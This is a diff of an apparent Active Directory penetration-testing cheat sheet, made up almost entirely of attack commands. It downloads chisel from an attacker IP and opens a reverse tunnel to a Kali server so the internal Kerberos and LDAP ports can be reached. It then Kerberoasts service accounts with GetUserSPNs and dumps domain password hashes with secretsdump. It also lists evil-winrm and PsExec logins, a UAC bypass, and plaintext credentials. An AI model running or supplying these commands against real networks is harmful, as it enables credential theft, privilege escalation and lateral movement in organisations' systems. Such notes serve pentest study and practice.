@@ -362,7 +362,16 @@ PS> net user \\mydc
 PS> klist  
 PS> PsExec.exe \\mydc cmd.exe  
   
+===================================
+Port 88 Internal Only - Chisel and Roast
 
+netstat -ap tcp
+iwr -uri http://192.168.162.46/chisel_windows_amd64.exe -outfile chisel.exe 
+PS C:\windows\temp> .\chisel.exe client 192.168.162.46:8008 R:88:127.0.0.1:88 R:389:localhost:389 
+kali> /opt/chisel/chisel server -p 8008 --reverse 
+kali> GetUserSPNs.py -request -dc-ip 127.0.0.1 mike.com/bob -save -outputfile GetUserSPNs.out                                                                                                                                              
+kali> GetUserSPNs.py -request -dc-ip 127.0.0.1 mike.com/bob
+Got the Kerberoast Hash 
  
 ===================================
 Domain Enums with PowerView 
@@ -422,5 +431,6 @@ Invoke-BypassUAC
 PWN
 
 evil-winrm -i 192.168.200.5 -u administrator -p paxxword
-impacket-secretsdump -system SYSTEM -ntds ntds.dit -hashes lmhash:nthash LOCAL -outputfile ntlm-extract 
-impacket-secretsdump mike.com/administrator@192.168.200.5
+secretsdump -system SYSTEM -ntds ntds.dit -hashes lmhash:nthash LOCAL -outputfile ntlm-extract 
+secretsdump.py -just-dc mrlky:Football#7@10.10.10.103    ..if 88 isnt exposed
+secretsdump mike.com/administrator@192.168.200.5         ..Remote
